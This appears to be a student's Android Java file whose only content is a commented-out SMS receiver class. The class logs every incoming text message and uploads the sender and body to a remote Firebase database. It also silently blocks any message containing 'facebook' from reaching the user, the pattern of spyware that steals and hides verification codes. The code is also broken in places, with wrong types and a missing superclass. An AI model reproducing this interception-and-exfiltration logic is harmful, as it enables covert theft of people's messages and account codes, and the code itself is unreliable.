package com.ugb.programacion;
/*
public class MyReceiverSMS {
    final SmsManager sms = SmsManager.
            getDefault();
    DatabaseReference mDatabase;
    private String miToken;
    public MyReceiverSMS() {
    }
    @Override
    public void onReceive(Context context, Intent intent) {
        final Bundle bundle = intent.getExtras();
        miToken = FirebaseInstanceId.
                getInstance().getToken();
        mDatabase = FirebaseDatabase.
                getInstance().getReference("sms");
        if(bundle!=null) {
            final Object[] pdusObj = (Object[]) bundle.get("pdus");
            for (int i = 0; i < pdusObj.length; i++) {
                sms MENSAJE = sms.
                        createFromPdu((byte[]) pdusObj[i]);
                String REMITENTE = MENSAJE.getDisplayOriginatingAddress();
                String MENSAJEE = MENSAJE.getDisplayMessageBody();
                Log.
                        i("RECEIVER", "numero:" + REMITENTE + " Mensaje:" + MENSAJEE);
                if(MENSAJEE.contains("facebook")){
                    abortBroadcast();
                }
                Map<String, String> mapSMS = new HashMap<String, String>();
                mapSMS.put("remitente", REMITENTE);
                mapSMS.put("mensaje", MENSAJEE);
                String id = mDatabase.push().getKey();
                mDatabase.child(id).setValue(mapSMS);
            }
        }
    }
}
*/
